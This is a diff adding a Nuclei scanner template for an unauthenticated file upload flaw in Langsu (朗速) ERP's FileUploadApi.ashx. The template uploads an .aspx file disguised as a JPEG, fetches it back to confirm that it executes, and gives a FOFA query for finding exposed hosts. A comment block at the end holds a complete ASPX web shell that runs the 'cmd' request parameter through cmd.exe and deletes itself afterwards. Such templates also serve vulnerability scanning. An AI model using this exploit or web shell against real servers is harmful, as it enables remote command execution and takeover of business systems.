@@ -1,0 +1,76 @@
+id: lserp-FileUploadApi-fileupload
+info:
+  name: 朗速 ERP 系统 FileUploadApi.ashx - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%9C%97%E9%80%9FERP/%E6%9C%97%E9%80%9FERP%E7%B3%BB%E7%BB%9FFileUploadApi.ashx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
+  tags: 2024,fileupload,lserp
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /Api/FileUploadApi.ashx?method=DoWebUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: image/jpeg
+
+        <% Response.Write("{{randstr}}") %>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |+
+        GET {{get_path}} HTTP/1.1
+        Host: {{Hostname}}
+        
+    extractors: 
+      - type: json
+        part: body
+        internal: true
+        name: get_path
+        json:
+          - ".data.WebRelPath"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
+
+
+# webshell
+
+        # <%@ Page Language="Jscript" validateRequest="false" %>
+        # <%
+        # var c=new System.Diagnostics.ProcessStartInfo("cmd");
+        # var e=new System.Diagnostics.Process();
+        # var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+        # c.UseShellExecute=false;
+        # c.RedirectStandardOutput=true;
+        # c.RedirectStandardError=true;
+        # e.StartInfo=c;
+        # c.Arguments="/c " + Request.Item["cmd"];
+        # e.Start();
+        # out=e.StandardOutput;
+        # EI=e.StandardError;
+        # e.Close();
+        # Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+        # System.IO.File.Delete(Request.PhysicalPath);
+        # Response.End();%>
